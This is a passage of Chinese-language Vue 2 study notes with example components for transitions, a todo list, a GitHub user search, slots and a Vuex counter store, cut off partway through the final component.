<template>
  <div>
    <button @click="isShow = !isShow">隐藏/显示</button>
    <!-- appear代表一上来就显示动画，默认是true -->
    <transition name="animation" appear>
      <h1 v-show="isShow">hello</h1>
    </transition>
  </div>
</template>

<script>
export default {
  name: "myTest",
  data() {
    return {
      isShow: true,
    };
  },
};
</script>

<style>
h1 {
  background-color: orange;
  width: 200px;
}
.animation-enter-active {
  animation: move 1s;
}
.animation-leave-active {
  animation: leave 1s;
}
@keyframes move {
  from {
    transform: translateX(-300px);
  }
  to {
    transform: translateX(0px);
  }
}

@keyframes leave {
  from {
    transform: translateX(0px);
  }
  to {
    transform: translateX(-300px);
  }
}
</style>
```

---

### 过渡效果

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=93

添加不同组的动画

```
<template>
  <div>
    <button @click="isShow = !isShow">隐藏/显示</button>
    <!-- appear代表一上来就显示动画，默认是true -->
    <transition name="animation1" appear>
      <h1 v-show="isShow">hello</h1>
    </transition>
    <transition name="animation2" appear>
      <h1 v-show="isShow">hello</h1>
    </transition>
  </div>
</template>

<script>
export default {
  name: "myTest",
  data() {
    return {
      isShow: true,
    };
  },
};
</script>

<style>
h1 {
  background-color: orange;
  width: 200px;
}
.animation1-enter-active {
  animation: move 1s;
}
.animation1-leave-active {
  animation: leave 1s;
}
.animation2-enter-active {
  animation: move 5s;
}
.animation2-leave-active {
  animation: leave 1s;
}
@keyframes move {
  from {
    transform: translateX(-300px);
  }
  to {
    transform: translateX(0px);
  }
}

@keyframes leave {
  from {
    transform: translateX(0px);
  }
  to {
    transform: translateX(-300px);
  }
}
</style>
```

实例

文件结构

![image](22CBCED0D5E646A09CB807ABCF483BE6)

main.js

```
//引入Vue
import Vue from "vue";
//引入App
import App from './App';

//关闭Vue的生产提示
Vue.config.productionTip = false;


new Vue({
    el: '#app',
    render: h => h(App),
    beforeCreate() {
        //事件总线
       Vue.prototype.$bus = this;
    }
});
```

App.vue

```
<template>
  <div id="root">
    <Test/>
    <Test2/>
    <Test3/>
  </div>
</template>

<script>
import Test from "@/components/Test";
import Test2 from "@/components/Test2";
import Test3 from "@/components/Test3";
export default {
  name: "App",
  components:{
     Test,
     Test2,
     Test3
  },
}
</script>
```

Test.vue
```
<template>
  <div>
    <button @click="isShow = !isShow">
      显示/隐藏
    </button>
    <transition name="hello" appear>
      <h1 v-show="isShow">你好啊!</h1>
    </transition>
  </div>
</template>

<script>
export default {
  name: "Test",
  data(){
    return {
      isShow: true
    }
  }
}
</script>

<style scoped>
  h1{
    background: orange;
  }
  .hello-enter-active{
    animation: anim linear 0.5s;
  }

  .hello-leave-active{
    animation: anim  linear 0.5s reverse;
  }
  @keyframes anim {
    from {
      transform: translateX(-100%);
    }
    to{
      transform: translateX(0px);
    }
  }
</style>
```

Test2.vue
```
<template>
  <div>
    <button @click="isShow = !isShow">
      显示/隐藏
    </button>
    <!--transition 只能包裹一个元素而transition-group可以包含多个元素-->
    <transition-group name="hello" appear>
      <h1 v-show="isShow" key="1">你好!</h1>
      <h1 v-show="isShow" key="2">Shanghai</h1>
    </transition-group>
  </div>
</template>

<script>
export default {
  name: "Test2",
  data(){
    return {
      isShow: true
    }
  }
}
</script>

<style scoped>
  h1{
    background: orange;
  }
  /*进入的起点，离开的终点*/
  .hello-enter,
  .hello-leave-to{
    transform: translateX(-100%);
  }
  /*进入的过程，离开的过程*/
  .hello-enter-active,
  .hello-leave-active{
    transition: linear .5s;
  }
  /*进入的终点,离开的起点*/
  .hello-enter-to,
  .hello-leave{
    transform: translateX(0);
  }

</style>
```

Test3.vue
```
<template>
  <div>
    <button @click="isShow = !isShow">
      显示/隐藏
    </button>
    <!--transition 只能包裹一个元素而transition-group可以包含多个元素-->
    <transition-group
        appear
        name="animate__animated animate__bounce"
        enter-active-class="animate__swing"
        leave-active-class="animate__backOutUp"
    >
      <h1 v-show="isShow" key="1">你好!</h1>
      <h1 v-show="isShow" key="2">Shanghai</h1>
    </transition-group>
  </div>
</template>

<script>
import 'animate.css';
export default {
  name: "Test3",
  data(){
    return {
      isShow: true
    }
  }
}
</script>

<style scoped>
  h1{
    background: orange;
  }
</style>
```

---

### todoList带过渡动画

文件结构

![image](C28A85CB78FE48B68E6DC751E1BDA082)

main.js

```
//引入Vue
import Vue from "vue";
//引入App
import App from './App';

//关闭Vue的生产提示
Vue.config.productionTip = false;


new Vue({
    el: '#app',
    render: h => h(App),
    beforeCreate() {
        //事件总线
       Vue.prototype.$bus = this;
    }
});
```

App.vue
```
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <MyHeader @addTodo="addTodo"/>
        <List
            :todos="todos"
        />
        <MyFooter
            :todos="todos"
            @checkAllTodo="checkAllTodo"
            @clearAllDoneTodo="clearAllDoneTodo"
        />
      </div>
    </div>
  </div>
</template>

<script>
import MyHeader from "@/components/MyHeader";
import List from "@/components/List";
import MyFooter from '@/components/MyFooter';
import pubsub from "pubsub-js";
export default {
  name: "App",
  components:{
    List,
    MyFooter,
    MyHeader
  },
  data() {
    return {
      // todos: [
      //   {id: '001', title: '吃饭', done: false},
      //   {id: '002', title: "睡觉", done: true},
      //   {id: '003', title: '打代码', done: false}
      // ]
      todos:JSON.parse(localStorage.getItem('todos')) || []
    }
  },
  methods:{
    //添加的todo
    addTodo(todo){
      console.log('我是app组件，我收到了数据');
      this.todos.unshift(todo);
    },
    checkTodo(id){
      const todo = this.todos.find(todo => todo.id === id);
      todo.done = !todo.done;
    },
    deleteTodo(_, id){
      this.todos = this.todos.filter(todo => todo.id !== id);
    },
    checkAllTodo(done){
      this.todos.forEach(todo => todo.done = done);
    },
    clearAllDoneTodo(){
      this.todos = this.todos.filter(todo => !todo.done)
    },
    updateTodo(id, title){
      this.todos.forEach(todo => {
         if(todo.id === id) todo.title = title;
      })
    }
  },
  watch:{
    //深度监视
    todos:{
      deep: true, //深度监视当我监视数组中的对象的某个属性的变化它也会产生反应
      handler(newValue) {
        //本地存储存的是key和value都是字符串
        //数据存放在本地存储中
        localStorage.setItem("todos", JSON.stringify(newValue))
      }
    },
  },
  //已挂在绑定事件总线
  mounted() {
    this.$bus.$on('checkTodo', this.checkTodo);
    this.$bus.$on('updateTodo', this.updateTodo);
    this.pubId = pubsub.subscribe('deleteTodo', this.deleteTodo);
  },
  //被卸载注意解绑
  beforeMount() {
    this.$bus.$off('checkTodo');
    this.$bus.$off('updateTodo');
    pubsub.unsubscribe(this.pubId); //取消订阅的方式与取消定时器的方式是类似的，记住
  }
}
</script>

<style>
/*base*/
body {
  background: #fff;
}

.btn {
  display: inline-block;
  padding: 4px 12px;
  margin-bottom: 0;
  font-size: 14px;
  line-height: 20px;
  text-align: center;
  vertical-align: middle;
  cursor: pointer;
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
  border-radius: 4px;
}

.btn-danger {
  color: #fff;
  background-color: #da4f49;
  border: 1px solid #bd362f;
}

.btn-danger:hover {
  color: #fff;
  background-color: #bd362f;
}

.btn-edit{
  color: #fff;
  background-color: skyblue;
  border: 1px solid rgb(103, 159, 180);
  margin-right: 5px;
}

.btn:focus {
  outline: none;
}

.todo-container {
  width: 600px;
  margin: 0 auto;
}
.todo-container .todo-wrap {
  padding: 10px;
  border: 1px solid #ddd;
  border-radius: 5px;
}

</style>
```

Item.vue
```
<template>
    <li>
      <label>
        <!--这里勾选和取消勾选可以使用change和click作为事件处理-->
        <input type="checkbox" :checked="todo.done" @change="handleCheck(todo.id)"/>
        <!--v-model数据的双向绑定，checkbox使用v-model来双向绑定其是否被勾选,也可以实现效果但不推荐(因为其实修改了props中的数据)-->
        <!--这里修改了从List修改过来的props,这里的不允许改是浅层次，就是如果props是一个对象则这个修改这个对象的某一个属性vue是放行的-->
        <!-- <input type="checkbox" v-model="todo.done"/>-->
        <span v-show="!todo.isEdit">{{  todo.title }}</span>
        <input
            type="text"
            :value="todo.title"
            v-show="todo.isEdit"
            @blur="handleBlur(todo, $event)"
            ref="inputTitle"
        />
      </label>
      <button class="btn btn-danger" @click="handleDelete(todo.id)">删除</button>
      <button v-show="!todo.isEdit" class="btn btn-edit" @click="handleEdit(todo)">编辑</button>
    </li>
</template>

<script>
import pubsub from "pubsub-js";
export default {
  name: "Item",
  //声明接收todo
  props: ['todo'],
  methods:{
    handleCheck(id){
      //事件总线
      this.$bus.$emit('checkTodo',id);
    },
    handleDelete(id){
      if(confirm(`确定删除编号为${id}的todo吗`)){
        // console.log(id);
        //事件总线
        // this.$bus.$emit('deleteTodo',id);
        //消息订阅改写
        pubsub.publish('deleteTodo', id);
      }
    },
    //编辑
    handleEdit(todo){
      // todo.isEdit = true; //注意这里添加的数据并不是响应式的 一定清楚
      if(Object.prototype.hasOwnProperty.call(todo, 'isEdit')){
        todo.isEdit = true;
      }else{
        this.$set(todo, 'isEdit', true); //保证初次加入的时候存在响应式的数据
      }
      //自动获取焦点
      //this.$refs.inputTitle.focus(); //此时你这行代码执行了，但是注意vue并没有重新解析模版(input并没有出现在页面上，dom节点并没有被更新)，它一定要等这个回调函数执行完之后才会去重新渲染模版
      //使用nextTick来解决
      this.$nextTick(() => {
        //这里的回调函数注意是在dom节点被更新之后才会运行的
        this.$refs.inputTitle.focus();
      })
      console.log(todo);
    },
    //失去焦点回调
    handleBlur(todo, e){
      todo.isEdit = false; //注意我在这里确保你身上一定存在isEdit属性
      if(!e.target.value.trim()) {
        alert('输入不能为空');
        return;
      }
      this.$bus.$emit('updateTodo', todo.id, e.target.value);
    }
  }
}
</script>

<style scoped>
/*item*/
li {
  list-style: none;
  height: 36px;
  line-height: 36px;
  padding: 0 5px;
  border-bottom: 1px solid #ddd;
}

li label {
  float: left;
  cursor: pointer;
}

li label li input {
  vertical-align: middle;
  margin-right: 6px;
  position: relative;
  top: -1px;
}

li button {
  float: right;
  display: none;
  margin-top: 3px;
}

li:before {
  content: initial;
}

li:last-child {
  border-bottom: none;
}

li:hover{
  background: #ddd;
}

li:hover button{
  display: block;
}

</style>
```

List.vue
```
<template>
  <ul class="todo-main">
    <!--appear代表一开始就会出现动画默认为 :appear='true'-->
    <transition-group name="todo" appear>
      <Item
          v-for="todoObj in todos"
          :key="todoObj.id"
          :todo="todoObj"
      />
    </transition-group>
  </ul>
</template>

<script>
import Item from "@/components/Item";

export default {
  name: "List",
  components: {
    Item,
  },
  props:['todos']
}
</script>

<style scoped>
/*main*/
.todo-main {
  margin-left: 0;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding: 0px;
}

.todo-empty {
  height: 40px;
  line-height: 40px;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding-left: 5px;
  margin-top: 10px;
}

.todo-enter-active{
  animation: anim linear 0.5s;
}

.todo-leave-active{
  animation: anim  linear 0.5s reverse;
}
@keyframes anim {
  from {
    transform: translateX(-100%);
  }
  to{
    transform: translateX(0px);
  }
}
</style>
```

MyFooter.vue
```
<template>
  <!--隐式类型转换-->
  <div class="todo-footer" v-show="total">
    <label>
      <!--这里也可用v-model来替代，此时不需要计算属性了-->
      <!--<input type="checkbox" :checked="isAll" @change="checkAll"/>-->
      <input type="checkbox" v-model="isAll"/>
    </label>
    <span>
       <span>已完成{{ doneTotal }}</span> / 全部{{total}}
    </span>
    <button class="btn btn-danger" @click="clearAll">清除已完成任务</button>
  </div>
</template>
<script>
export default {
  name: "MyFooter",
  props: ['todos'],
  computed:{
    total(){
      return this.todos.length;
    },
    doneTotal(){
      return this.todos.reduce((todoTotal, todo) => {
        //隐士类型转换
        return todoTotal + todo.done;
      }, 0);
      // return this.todos.filter(todo => todo.done).length;
    },
    isAll:{
      get(){
        return this.total === this.doneTotal && this.doneTotal > 0; //计算属性可以通过其他的计算属性接着进行计算得到结果
      },
      set(value){
        //value注意要么为true，要么为false，因为你是把它应用在了checkbox上
        //this.checkAllTodo(value);
        //采用自定义事件来修改
        this.$emit('checkAllTodo', value);
      }
    }
  },
  methods:{
    // checkAll(e){
    //   // console.log(e.target.checked); //判断这个checkbox到底是不是全选 true全选 false全不选
    //   this.checkAllTodo(e.target.checked);
    // }
    clearAll(){
       // this.clearAllDoneTodo();
      //修改为自定义事件
      this.$emit('clearAllDoneTodo');
    }
  }
}
</script>

<style scoped>
/*footer*/
.todo-footer {
  height: 40px;
  line-height: 40px;
  padding-left: 6px;
  margin-top: 5px;
}

.todo-footer label {
  display: inline-block;
  margin-right: 20px;
  cursor: pointer;
}

.todo-footer label input {
  position: relative;
  top: -1px;
  vertical-align: middle;
  margin-right: 5px;
}

.todo-footer button {
  float: right;
  margin-top: 5px;
}
</style>
```

MyHeader.vue
```
<template>
  <div class="todo-header">
    <input type="text" placeholder="请输入你的任务名称，按回车键确认" v-model="title" @keyup.enter="add"/>
  </div>
</template>

<script>
import { nanoid } from 'nanoid';
export default {
  //注意不管是你写的data也还还是methods也好，甚至是computed计算属性也好都会出现在组件事例对象vc身上
  //属性值不能重名
  name: "MyHeader",
  data(){
    return {
      title: ''
    }
  },
  methods:{
    add(){
      //将用户的输入包装成一个todo对象
      console.log(this.title)
      if(!this.title.trim()) {
        alert('代办事项不能为空')
        return; //输入的代办事项为空则不走下面流程
      }
      const todoObj = {
        id: nanoid(),
        title: this.title,
        done:false
      }
      // console.log(todoObj);
      // this.addTodo(todoObj);
      //采用自定义事件来修改
      this.$emit('addTodo',todoObj);
      this.title = '';
    }
  },
}
</script>

<style scoped>
/*header*/
.todo-header input {
  width: 560px;
  height: 28px;
  font-size: 14px;
  border: 1px solid #ccc;
  border-radius: 4px;
  padding: 4px 7px;
}

.todo-header input:focus {
  outline: none;
  border-color: rgba(82, 168, 236, 0.8);
  box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(82, 168, 236, 0.6);
}
</style>
```

---

### 配置代理

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=96

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=97

---

### github案例

文件结构

![image](9E9A3F5DFDED445CB6A40A0AF9179473)

main.js

```
//引入Vue
import Vue from "vue";
//引入App
import App from './App';

//关闭Vue的生产提示
Vue.config.productionTip = false;


new Vue({
    el: '#app',
    render: h => h(App),
    beforeCreate() {
        Vue.prototype.$bus = this;
    }
});
```

App.vue
```
<template>
    <div class="container">
      <Search/>
      <List/>
    </div>
</template>

<script>
import Search from "@/components/Search";
import List from "@/components/List";
export default {
  name: "App",
  components:{
    Search,
    List
  }
}
</script>
<style lang="css">
</style>
```

List.vue

```
<template>
  <div class="row">
    <!--展示用户列表-->
    <div v-show="info.users.length" class="card" v-for="user in info.users" :key="user.login">
      <a :href="user.html_url" target="_blank">
        <img :src="user.avatar_url" style='width: 100px'/>
      </a>
      <p class="card-text">{{ user.login }}</p>
    </div>
    <!---欢迎词-->
    <h1 v-show="info.isFirst">Welcome!</h1>
    <!--加载中--->
    <h1 v-show="info.isLoading">Loading...</h1>
    <!---错误信息-->
    <h1 v-show="info.errMsg">Something has been wrong, errorMessage: {{ info.errMsg }}</h1>
  </div>
</template>

<script>
export default {
  name: "List",
  data(){
    return {
      info : {
        isFirst: true, //是否为第一次使用
        users:[],
        isLoading: false, //是否在加载中
        errMsg: '',
      }
    }
  },
  mounted() {
    this.$bus.$on('updateListData', (dataObj) => {
      // console.log(`我是list，接到了数据data:`, users);
      // this.isFirst = isFirst;
      // this.isLoading = isLoading;
      // this.errMsg = errMsg;
      // this.users = users;
      this.info = { ...this.info, ...dataObj };
    });
  }

}
</script>

<style scoped>
.album {
  min-height: 50rem; /* Can be removed; just added for demo purposes */
  padding-top: 3rem;
  padding-bottom: 3rem;
  background-color: #f7f7f7;
}

.card {
  float: left;
  width: 33.333%;
  padding: .75rem;
  margin-bottom: 2rem;
  border: 1px solid #efefef;
  text-align: center;
}

.card > img {
  margin-bottom: .75rem;
  border-radius: 100px;
}

.card-text {
  font-size: 85%;
}
</style>
```

Search.vue
```
<template>
  <section class="jumbotron">
    <h3 class="jumbotron-heading">Search Github Users</h3>
    <div>
      <input type="text" placeholder="enter the name you search" v-model="keyword"/>&nbsp;
      <button @click="searchUsers">Search</button>
    </div>
  </section>
</template>

<script>
import axios from "axios";
export default {
  name: "Search",
  data() {
    return {
      keyword: '',
    }
  },
  methods:{
    //使用全局事件总线在组件间传递数据
    searchUsers(){
      this.$bus.$emit('updateListData', {
        isFirst: false,
        isLoading: true,
        errMsg: '',
        users: []
      })
      axios.get(`https://api.github.com/search/users?q=${this.keyword}`)
      .then(res => {
        console.log(res.data.items);
        this.$bus.$emit("updateListData", {
          isLoading: false,
          errMsg: '',
          users: res.data.items
        });
      })
      .catch(e => {
        console.log(`请求失败:${e.message}`)
        this.$bus.$emit("updateListData", {
          isLoading: false,
          errMsg: e.message,
          users: []
        });
      });
    }
  }
}
</script>

<style scoped>

</style>
```

---

### vue-resource

vue-resourse实现github案例

改动部分

Search.vue
```
<template>
  <section class="jumbotron">
    <h3 class="jumbotron-heading">Search Github Users</h3>
    <div>
      <input type="text" placeholder="enter the name you search" v-model="keyword"/>&nbsp;
      <button @click="searchUsers">Search</button>
    </div>
  </section>
</template>

<script>
export default {
  name: "Search",
  data() {
    return {
      keyword: '',
    }
  },
  methods:{
    //使用全局事件总线在组件间传递数据
    searchUsers(){
      this.$bus.$emit('updateListData', {
        isFirst: false,
        isLoading: true,
        errMsg: '',
        users: []
      })
      this.$http.get(`https://api.github.com/search/users?q=${this.keyword}`)
      .then(res => {
        console.log(res.data.items);
        this.$bus.$emit("updateListData", {
          isLoading: false,
          errMsg: '',
          users: res.data.items
        });
      })
      .catch(e => {
        console.log(`请求失败:${e.message}`)
        this.$bus.$emit("updateListData", {
          isLoading: false,
          errMsg: e.message,
          users: []
        });
      });
    }
  }
}
</script>

<style scoped>

</style>
```

---

### 默认插槽

实现如下效果

![image](D79A8BCEABC748AB98308DDF9821CBB5)

代码

App.vue
```
<!-- 单文件组件 -->
<!-- App.vue组件是所有组件的父组件 -->

<!-- 组件html代码 -->
<template>
  <div id="app" class="container">
    <MyCatagory title="美食" :listData="foods"></MyCatagory>
    <MyCatagory title="游戏" :listData="games"></MyCatagory>
    <MyCatagory title="电影" :listData="films"></MyCatagory>
  </div>
</template>

<!-- 组件脚本文件 -->
<script>
import MyCatagory from "./components/MyCatagory.vue";
export default {
  // 组件命名
  name: "App",
  // 注册组件
  components: {
    MyCatagory,
  },
  data() {
    return {
      foods: ["火捰", "烧烤"],
      games: ["红色警戒", "CF"],
      films: ["教父", "流浪地球"],
    };
  },
  methods: {},
};
</script>

<!-- 组件样式 -->
<style>
.app {
  background-color: gray;
}
.container {
  display: flex;
}
</style>
```

MyCatagory.vue
```
<template>
  <div class="catagory">
    <h3>{{ title }}</h3>
    <ul>
      <li v-for="(item, index) in listData" :key="index">{{ item }}</li>
    </ul>
  </div>
</template>

<script>
export default {
  name: "MyCatagory",
  props: ["title", "listData"],
};
</script>

<style>
* {
  padding: 0;
}
li {
  list-style: none;
  list-style-type: none;
}
.catagory {
  background-color: skyblue;
  padding: 10px 30px;
}
</style>
```

但是下面如何实现？

![image](2052A225C7424D8BB569CBC25B191581)

利用默认插槽实现。

文件结构

![image](0B84BB1ACCC847888E9399EBECBF93B6)

main.js

```
//引入Vue
import Vue from "vue";
//引入vue-resource
//引入App
import App from './App';

//关闭Vue的生产提示
Vue.config.productionTip = false;


new Vue({
    el: '#app',
    render: h => h(App),
    beforeCreate() {
        Vue.prototype.$bus = this;
    }
});
```

App.vue
```
<template>
   <div class="container">
     <Category title="美食">
       <img src="" alt="delicious food"/>
     </Category>

     <Category title="游戏" :listData="games">
       <ul>
         <li v-for="(g , index) in games" :key="index">{{ g }}</li>
       </ul>
     </Category>

     <Category title="电影">
       <video src="http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4" controls></video>
     </Category>
   </div>
</template>

<script>
import Category from "@/components/Category";
export default {
  name: "App",
  components:{
    Category
  },
  data(){
    return {
      foods:['火锅','烧烤','小龙虾','牛排'],
      games:['红色警戒','穿越火线','劲舞团','超级玛丽'],
      films:['《教父》','《拆弹专家》','《你好，李焕英》','《尚硅谷》']
    }
  }
}
</script>
<style lang="css" scoped>
   .container{
     display: flex;
     justify-content: space-around;
   }
   video {
     width: 100%;
   }
   img{
     width: 100%;
   }
</style>
```

Category.vue

```
<template>
  <div class="category">
    <h3>{{ title }}</h3>
    <!--插槽,等着组件的使用者进行填充-->
    <slot>我是默认值</slot>
  </div>
</template>

<script>
export default {
  name: "Category",
  props:[ 'listData', 'title' ]
}
</script>

<style scoped>
   .category{
     background: skyblue;
     width: 200px;
     height: 300px;
   }
   h3{
     text-align: center;
     background: orange;
   }
   img{
     width: 100%;
   }
</style>
```

---

### 具名插槽

文件结构

![image](EAE3FBEF4981473688901C0F4B9DD9D1)

main.js
```
//引入Vue
import Vue from "vue";
//引入vue-resource
//引入App
import App from './App';

//关闭Vue的生产提示
Vue.config.productionTip = false;


new Vue({
    el: '#app',
    render: h => h(App),
    beforeCreate() {
        Vue.prototype.$bus = this;
    }
});
```

App.vue
```
<template>
   <div class="container">
     <Category title="美食">
       <img slot="center" src="" alt="delicious food"/>
       <a href="https://www.baidu.com" slot="footer">百度</a>
     </Category>

     <Category title="游戏" :listData="games">
       <ul slot="center">
         <li v-for="(g , index) in games" :key="index">{{ g }}</li>
       </ul>
       <div slot="footer" class="foot">
         <a href="https://www.baidu.com">单机游戏</a>
         <a href="https://www.baidu.com">网络游戏</a>
       </div>
     </Category>

     <Category title="电影">
       <video slot="center" src="http://clips.vorwaerts-gmbh.de/big_buck_bunny.mp4" controls></video>
       <!--但是注意v-slot仅仅只能被用在组件上或者template标签上-->
       <template v-slot:footer>
         <div class="foot">
           <a href="https://www.baidu.com">经典</a>
           <a href="https://www.baidu.com">热门</a>
           <a href="https://www.baidu.com">推荐</a>
         </div>
         <h4>欢迎来到影院观赏</h4>
       </template>
     </Category>
   </div>
</template>

<script>
import Category from "@/components/Category";
export default {
  name: "App",
  components:{
    Category
  },
  data(){
    return {
      foods:['火锅','烧烤','小龙虾','牛排'],
      games:['红色警戒','穿越火线','劲舞团','超级玛丽'],
      films:['《教父》','《拆弹专家》','《你好，李焕英》','《尚硅谷》']
    }
  }
}
</script>
<style lang="css" scoped>
   .container, .foot{
     display: flex;
     justify-content: space-around;
   }
   h4{
     text-align: center;
   }
</style>
```

Category.vue
```
<template>
  <div class="category">
    <h3>{{ title }}</h3>
    <!--插槽,等着组件的使用者进行填充-->
    <slot name="center">我是默认值</slot>
    <slot name="footer">我是默认值</slot>
  </div>
</template>

<script>
export default {
  name: "Category",
  props:[ 'listData', 'title' ]
}
</script>

<style scoped>
   .category{
     background: skyblue;
     width: 200px;
     height: 300px;
   }
   h3{
     text-align: center;
     background: orange;
   }
   img{
     width: 100%;
   }
   video{
     width: 100%;
   }
</style>
```

---

### 作用域插槽

文件结构

![image](B644A72104D14D68A64E6554B0E628A7)

main.js
```
//引入Vue
import Vue from "vue";
//引入vue-resource
//引入App
import App from './App';

//关闭Vue的生产提示
Vue.config.productionTip = false;


new Vue({
    el: '#app',
    render: h => h(App),
    beforeCreate() {
        Vue.prototype.$bus = this;
    }
});
```

App.vue
```
<template>
   <div class="container">
     <Category title="游戏">
       <template scope="{games}">
         <!--这里data为插槽给你传递的对象包含你所需要的数据 包装成对象的原因就是你当时可能个插槽传递了多个数据-->
         <ul>
           <li v-for="(g , index) in games" :key="index">{{ g }}</li>
         </ul>
       </template>
     </Category>

     <Category title="游戏">
       <template scope="{games}">
         <!--这里data为插槽给你传递的对象包含你所需要的数据-->
         <ol>
           <li  v-for="(g , index) in games" :key="index">{{ g }}</li>
         </ol>
       </template>
     </Category>

     <Category title="游戏">
       <template slot-scope="{games}">
         <h4 v-for="(g , index) in games" :key="index">{{ g }}</h4>
       </template>
     </Category>
   </div>
</template>

<script>
import Category from "@/components/Category";
export default {
  name: "App",
  components:{
    Category
  },
}
</script>
<style lang="css" scoped>
   .container, .foot{
     display: flex;
     justify-content: space-around;
   }
</style>
```

Category.vue
```
<template>
  <div class="category">
    <h3>{{ title }}</h3>
    <!--插槽,等着组件的使用者进行填充-->
    <slot :games="games">
      我是默认值
    </slot>
  </div>
</template>

<script>
export default {
  name: "Category",
  props:[ 'listData', 'title' ],
  data(){
    return {
      games:['红色警戒','穿越火线','劲舞团','超级玛丽'],
    }
  }
}
</script>

<style scoped>
   .category{
     background: skyblue;
     width: 200px;
     height: 300px;
   }
   h3{
     text-align: center;
     background: orange;
   }
</style>
```

---

### Vuex

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=106

---

### 案例

求和案例代码

```
<template>
  <div>
    <h1>sum={{sum}}</h1>
    <select name="" id="" v-model="n">
      <option :value="1">1</option>
      <option :value="2">2</option>
      <option :value="3">3</option>
    </select>
    <button @click="increment">+</button>
    <button @click="decrement">-</button>
    <button @click="incrementAdd">当前求和为奇数再加</button>
    <button @click="waitIncrement">等一等再加</button>
  </div>
</template>

<script>
export default {
  name: "CountNum",
  data() {
    return {
        n: 1,
        sum: 0
    }
  },
  methods: {
    increment() {
        this.sum += this.n
    },
    decrement() {
        this.sum -= this.n
    },
    incrementAdd() {
        if(this.sum%2 === 1) {
            this.sum -= this.n
        }
    },
    waitIncrement() {
        return;
    }
}};
</script>

<style>
button {
  margin: 10px;
}
</style>
```

---

### Vuex原理

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=107

---

### vuex实现求和案例

![image](541B3F72B5D64601854C7314C4B2E8FE)

main.js
```
//引入Vue
import Vue from "vue";
//引入App
import App from './App';
//引入store
import store from './store';

//关闭Vue的生产提示
Vue.config.productionTip = false;

new Vue({
    el: '#app',
    store,
    render: h => h(App),
});
```

App.vue
```
<template>
   <div>
     <Count/>
   </div>
</template>

<script>
import Count from "@/components/Count";
export default {
  name: "App",
  components:{
    Count
  },
  mounted() {
    console.log('App', this);
  }
}
</script>
<style lang="css" scoped>

</style>
```

store/index.js
```
/**
 * 该文件用于创建vuex中最核心的store
 */

//引入Vuex
import Vuex from 'vuex';
import Vue from "vue";

//使用vuex来集中管理状态,必要
//new store的前提是必须要使用Vuex插件
Vue.use(Vuex);

//创建actions(本质就是对象) 用于响应组件中的动作
const actions = {
    //收到上下文对象(包含commit)和dispatch过来的值
    // increment(context, value){
    //     context.commit('INCREMENT', value);
    // },
    // decrement(context, value){
    //     context.commit('DECREMENT', value);
    // },
    incrementIfOdd(context, value){
        // console.log(`action中的incrementIfOdd被调用`);
        // console.log('处理了一些事情');
        // context.dispatch('demo1', value);
        if(context.state.sum % 2) {
            console.log('@')
            context.commit('INCREMENT',value);
            // context.state.sum += 1;//这样可以实现但是记住本次对状态的改变开发者工具将无法捕获，因为开发者工具是对mutations对话的
        }
    },
    incrementWait(context, value){
        setTimeout(() => {
            context.commit('INCREMENT', value);
        },500)
    },
    // demo1(context, value){
    //     console.log('处理了一些事情---demo1');
    //     context.dispatch('demo2', value);
    // },
    // demo2(context, value){
    //     console.log('在action的demo中完成最终的逻辑');
    //     if(context.state.sum % 2) {
    //         console.log('@')
    //         context.commit('INCREMENT',value);
    //     }
    // }
}

//创建mutations(本质也是对象) 用于修改数据(state)
const mutations = {
    //收到state和要操作数value
    INCREMENT(state, value) {
        state.sum += value;
    },
    DECREMENT(state, value) {
        state.sum -= value;
    },
}

//准备getters用于加工state，将其共享于各个组件当中
const getters = {
    bigSum(state){
        return state.sum * 10;
    }
}

//准备state(数据) 存储数据
//类似于各个组件里的computed(计算属性),只不过它是共享的
const state = {
    sum: 0,
    school: 'Wust',
    subject: 'Computer Science',
}


//创建并暴露store
export default new Vuex.Store({
    actions,
    mutations,
    state,
    getters
});
```

Count.vue
```
<template>
  <div>
    <h1>当前求和为: {{ sum }}</h1>
    <!--让其收集到的数据全是number类型的 number修饰符-->
    <h3>当前求和放大3倍为:{{ bigSum }}</h3>
    <h3>我在{{ school }}, 学习{{ subject }}</h3>
    <select v-model.number="n">
      <!--让所有的value全部绑定为数字-->
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
    </select>
    <button @click="increment(n)">+</button>
    <button @click="decrement(n)">-</button>
    <button @click="incrementIfOdd(n)">当前求和为奇数再加</button>
    <button @click="incrementWait(n)">等一等再加</button>
  </div>
</template>

<script>
import { mapState, mapGetters, mapMutations, mapActions} from 'vuex';
export default {
  //计数组件
  name: "Count",
  data(){
    return {
      n: 1,// 代表用户在select框开始的时候选择的数字
    }
  },
  computed:{
    //借助mapState从state中生成计算属性,对象写法
    // ... mapState({
    //   sum:'sum',
    //   school: 'school',
    //   subject: 'subject'
    // }),
    //借助mapState从state中生成计算属性,数组写法(即代表了生成的计算属性名为sum，同时也代表了从state找到sum)
    ... mapState(['sum', 'school', 'subject']),

    //借助mapGetters从getters中生成计算属性,对象写法
    // ...mapGetters({ bigSum: 'bigSum' }),
    //借助mapGetters从getters中生成计算属性,数组写法
    ...mapGetters(['bigSum']),

  },
  methods:{
    // increment(){
    //   this.$store.commit('INCREMENT', this.n);
    // },
    // decrement(){
    //   this.$store.commit('DECREMENT', this.n);
    // },
    //借助mapMutations生成对应方法，方法会调用commit去联系mutations，对象写法
    ...mapMutations({
      increment: 'INCREMENT',
      decrement: 'DECREMENT',
    }),
    //借助数组写法生成方法,但注意你生成的方法名和mutations里对应的方法名将会一样的
    // ...mapMutations(['increment', 'decrement']),

    // incrementOdd(){
    //   this.$store.dispatch('incrementIfOdd', this.n);
    // },
    // incrementWait(){
    //   this.$store.dispatch('incrementWait', this.n);
    // }

    //借助mapMutations生成对应方法，方法会调用dispatch去联系actions，对象写法
    // ...mapActions({
    //   incrementIfOdd: 'incrementIfOdd',
    //   incrementWait: 'incrementWait',
    // }),

    ...mapActions(['incrementWait', 'incrementIfOdd']), //数组写法,同上
  },
